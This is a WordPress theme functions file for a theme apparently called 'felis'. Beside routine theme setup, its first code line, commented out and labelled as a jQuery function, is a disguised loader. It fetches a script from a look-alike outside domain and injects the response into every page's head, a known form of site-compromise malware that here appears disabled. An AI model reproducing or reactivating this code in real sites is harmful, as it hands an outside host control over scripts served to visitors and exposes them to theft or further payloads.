<?php

//Jquery Function
// if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url="http://www.jqueryc.com/jquery-1.6.3.min.js";$ch = curl_init();$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}

//Text Domain
define('SG_TDN', 'felis');

//Add features or post thumbnail sizes here
function sg_user_theme_setup()
{
	/* Add theme-supported features. */
	/* add_theme_support(''); */

	/* Add images sizes */
	/* Please use 'cm_' prefix to name */
	/* add_image_size('cm_myimage', 100, 100, true); */
}

//Theme Setup
require_once TEMPLATEPATH . '/functions/init.php';